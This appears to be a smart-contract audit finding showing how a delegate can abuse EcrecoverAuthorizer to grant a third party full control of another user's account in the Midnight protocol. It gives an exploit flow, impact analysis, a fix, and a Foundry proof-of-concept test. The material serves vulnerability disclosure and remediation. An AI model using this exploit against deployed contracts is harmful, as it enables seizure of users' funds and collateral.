### Title
Transitive Authorization Escalation via EcrecoverAuthorizer Delegate Signature — (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary

`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that `isAuthorized[authorizer][signer]` is true for in Midnight, not just the authorizer themselves. Because Midnight's `isAuthorized` mapping is a general-purpose delegation flag used for many operations (ratifiers, collateral helpers, etc.), any delegate B that A has authorized for any reason can sign an `Authorization` struct naming A as `authorizer` and an arbitrary C as `authorized`, thereby granting C full Midnight authorization over A's account without A ever signing anything related to C.

### Finding Description

**Code path:**

`EcrecoverAuthorizer.setIsAuthorized` (lines 24–48, `src/periphery/EcrecoverAuthorizer.sol`):

```
signer = ecrecover(digest, ...)
require(
    signer == authorization.authorizer
    || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
``` [1](#0-0) 

The signer check at line 34 passes if `isAuthorized[A][B]` is true in Midnight. This is the same mapping used to authorize ratifiers, collateral managers, and any other delegate. There is no restriction that the delegate was specifically authorized to sign `Authorization` structs.

**Midnight's `setIsAuthorized` (called at line 47):**

```solidity
require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
``` [2](#0-1) 

`msg.sender` here is `ecrecoverAuthorizer`. If A has done `midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, A)` (the standard setup step), this check passes, and `isAuthorized[A][C]` is set to true.

**Exploit flow:**

1. A calls `midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, A)` — standard setup.
2. A calls `midnight.setIsAuthorized(B, true, A)` — authorizes B for any purpose (e.g., as a ratifier delegate).
3. B constructs `Authorization{authorizer:A, authorized:C, isAuthorized:true, nonce:0, deadline:future}` and signs it with B's key.
4. Anyone calls `ecrecoverAuthorizer.setIsAuthorized(auth, sig_by_B)`.
5. Inside: `ecrecover` returns B; `isAuthorized[A][B]` is true → signer check passes.
6. `midnight.setIsAuthorized(C, true, A)` is called with `msg.sender = ecrecoverAuthorizer`; `isAuthorized[A][ecrecoverAuthorizer]` is true → succeeds.
7. Result: `isAuthorized[A][C] == true`.

**Why existing checks fail:** The nonce and deadline checks only prevent replay; they do not restrict *who* may sign. The `isAuthorized` check is intended to allow the authorizer's own delegate to submit a pre-signed authorization, but it conflates "authorized for general Midnight operations" with "authorized to grant new authorizations via EcrecoverAuthorizer." No check restricts the scope of the delegation. [3](#0-2) 

### Impact Explanation

Once `isAuthorized[A][C] == true`, C can call any Midnight entry point on behalf of A: `withdraw`, `withdrawCollateral`, `setConsumed`, `setIsAuthorized` (to further delegate), etc. C can drain A's credit balance and seize A's collateral. This is a direct unauthorized asset seizure with no further preconditions beyond those already described. [4](#0-3) 

### Likelihood Explanation

The preconditions are realistic and common: any user of `EcrecoverAuthorizer` must authorize it in Midnight (step 1), and any user who has delegated any operation to another address (step 2) is vulnerable. The attack requires B to be a willing attacker or a compromised key, but B need not have any special privilege beyond being a prior Midnight delegate of A. The attack is repeatable for any nonce value and any future deadline.

### Recommendation

Remove the `isAuthorized` delegate path from `EcrecoverAuthorizer.setIsAuthorized`. Only the `authorization.authorizer` themselves should be permitted to sign an `Authorization` struct:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

If delegation of signing rights is desired, it must be tracked in a separate, scoped mapping within `EcrecoverAuthorizer` itself (e.g., `authorizedSigners[authorizer][signer]`), not reusing the general-purpose Midnight `isAuthorized` mapping. [5](#0-4) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract TransitiveDelegateEscalationTest is BaseTest {
    function testDelegateBCanGrantAuthorizationForA() public {
        address A = borrower;
        address B = otherBorrower;   // delegate of A
        address C = otherLender;     // attacker's target

        // Step 1: A authorizes ecrecoverAuthorizer (standard setup)
        vm.prank(A);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, A);

        // Step 2: A authorizes B for some purpose (e.g., ratifier helper)
        vm.prank(A);
        midnight.setIsAuthorized(B, true, A);

        // Step 3: B signs Authorization{authorizer:A, authorized:C, isAuthorized:true}
        Authorization memory auth = Authorization({
            authorizer: A,
            authorized: C,
            isAuthorized: true,
            nonce: ecrecoverAuthorizer.nonce(A),  // 0
            deadline: block.timestamp + 1 days
        });
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[B], digest);
        Signature memory sig = Signature({v: v, r: r, s: s});

        // Step 4: Anyone submits
        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        // Step 5: Assert C is now authorized by A — without A ever signing anything about C
        assertTrue(midnight.isAuthorized(A, C));
        // C can now withdraw A's credit or collateral
    }
}
```

Expected: `assertTrue(midnight.isAuthorized(A, C))` passes, confirming the escalation. [3](#0-2) [6](#0-5)

    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
